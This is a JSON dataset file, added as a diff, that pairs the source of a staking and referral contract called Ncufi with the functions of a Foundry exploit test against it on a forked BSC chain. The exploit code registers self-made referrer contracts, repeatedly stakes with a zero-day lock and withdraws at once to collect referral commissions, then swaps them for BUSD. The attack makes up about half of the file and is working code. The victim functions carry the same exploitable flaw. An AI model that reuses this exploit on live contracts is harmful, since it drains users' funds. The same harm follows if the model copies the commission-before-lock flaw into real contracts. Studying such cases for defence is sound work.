@@ -1,0 +1,163 @@
+[
+  {
+    "contract/interface": "INcufi",
+    "source_type": "victim_contract",
+    "function_name": "STAKE",
+    "original_code": "     function STAKE (uint amout ,uint day,uint countryid) public {\n       require( isRegistered(msg.sender) == true);\n       contractToken.transferFrom(msg.sender, address(this), amout);\n       uint APy = ApyLock[day];\n       address head = countryhead[countryid];\n       address sponser = user[msg.sender].sponsore;\n       uint end = block.timestamp+(day*86400);\n       address secondSponser = user[msg.sender].secondSsponsore;\n       uint one = (amout*Firstlevel)/(100);\n       uint two = (amout*Secondlevel)/(100);\n       uint he = (amout*HeadPercent)/(100);\n        CommissionContractToken.transfer(sponser,one);\n        CommissionContractToken.transfer(secondSponser,two);\n        CommissionContractToken.transfer(head,he);\n       SId.increment();\n       uint newID = SId.current();\n       OrdereMap[newID] = order(newID,amout,APy,day,block.timestamp,end,false,msg.sender,0,Price,setdecimal,0);\n       totaldepsoit+=amout;\n       commisionAmount[sponser]+=one;\n       commisionAmount[secondSponser]+=two;\n       commisionAmount[head]+=he;\n     }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "INcufi",
+    "source_type": "victim_contract",
+    "function_name": "listMyoID",
+    "original_code": "function listMyoID() public view returns (order [] memory){\n        uint LockcountItem = SId.current();\n        uint activeTradeCount =0;\n        uint current =0;\n        for (uint i=0; i< LockcountItem; i++){\n            if(OrdereMap[i+1].USer == msg.sender){\n                activeTradeCount +=1;\n        }\n    }\n     order[] memory items1 = new order[](activeTradeCount);\n      for (uint i=0; i< LockcountItem; i++){\n             if(OrdereMap[i+1].USer == msg.sender){\n                uint currentId = OrdereMap[i+1].id;\n                order storage currentItem = OrdereMap[currentId];\n                items1[current] = currentItem;\n                current +=1;\n             }\n        }\n        return items1;\n\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "INcufi",
+    "source_type": "victim_contract",
+    "function_name": "register",
+    "original_code": "     function register(address referrer)  public {\n        require(msg.sender != referrer && !isRegistered(msg.sender), \"Invalid registration\");\n        require(isRegistered(referrer)==true,\"Reffral not registred\");\n        address sencod = user[referrer].sponsore;\n        user[msg.sender] = User(msg.sender,referrer,sencod, new address[](0), new address[](0),block.timestamp,true);\n        user[referrer].downline.push(msg.sender);\n        user[sencod].secondLeveldownline.push(msg.sender);\n        totalParticipants++;\n     }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "INcufi",
+    "source_type": "victim_contract",
+    "function_name": "swapCommision",
+    "original_code": "function swapCommision (uint amount) public {\n     require( isRegistered(msg.sender) == true,\"not registred\");\n      CommissionContractToken.transferFrom(msg.sender, address(this), amount);\n      uint swapamount = (amount);\n      contractToken.transfer(msg.sender,swapamount);\n\n\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "INcufi",
+    "source_type": "victim_contract",
+    "function_name": "withdral",
+    "original_code": "function withdral(uint id) public{\n    require (OrdereMap[id].complet == false,\"already complet\");\n    require (OrdereMap[id].USer== msg.sender,\"not your order\");\n    require (OrdereMap[id].enddate< block.timestamp,\"not your order\");\n     contractToken.transfer(msg.sender,OrdereMap[id].amount);\n     OrdereMap[id].complet = true;\n     OrdereMap[id].withdraltime = block.timestamp;\n     WId.increment();\n     uint newLockID = WId.current();\n    WithdrawMap[newLockID]= Withdraw(newLockID,id,msg.sender,OrdereMap[id].amount, block.timestamp);\n    totalwithdral+=OrdereMap[id].amount;\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "One_referer",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "Start",
+    "original_code": "    function Start(\n        uint256 id\n    ) public {\n        Ncufi.withdral(id);\n        uint256 A = AKITADEF.balanceOf(One_referer);\n        uint256 B = AKITADEF.balanceOf(Two_referer);\n        if (A > 0 || B > 0) {\n            AKITADEF.transferFrom(address(One_referer), address(this), A);\n            AKITADEF.transferFrom(address(Two_referer), address(this), B);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "Two_referer",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "attack",
+    "original_code": "    function attack() public {\n        //Step 1\n        One_referer = create_contract(1);\n        // address referer=IMoney(One_referer).getAdd();\n        Two_referer = cal_address(2, address(this));\n        Ncufi.register(Two_referer);\n\n        //Step 2\n        uint256 i = 0;\n        BUSD.approve(address(Ncufi), 9_999_999_999 ether);\n        while (i < 100) {\n            Ncufi.STAKE(10_000 ether, 0, 1);\n            vm.warp(block.timestamp + 100);\n            INcufi.order[] memory orders = Ncufi.listMyoID();\n            uint256 id = orders[i].id;\n            Start(id);\n            i++;\n        }\n\n        //End\n        // emit log_named_decimal_uint(\"[End] victim Ncufi BUSD balance\", BUSD.balanceOf(address(Ncufi)), 18);\n        AKITADEF.approve(address(Ncufi), type(uint256).max);\n        Ncufi.swapCommision(59_643.218325 ether);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 39_729_927);\n        deal(address(BUSD), address(this), 50_000 ether);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[End] Attacker BUSD before exploit\", BUSD.balanceOf(address(this)), 18);\n        attack();\n        emit log_named_decimal_uint(\"[End] Attacker Ncufi after exploit\", AKITADEF.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[End] Attacker BUSD after exploit\", BUSD.balanceOf(address(this)), 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Money",
+    "source_type": "attacker_contract",
+    "function_name": "getAdd",
+    "original_code": "    function getAdd() public returns (address) {\n        require(owner == msg.sender, \"error\");\n        return Moneysadd;\n    }\n\n",
+    "description": ""
+  }
+]
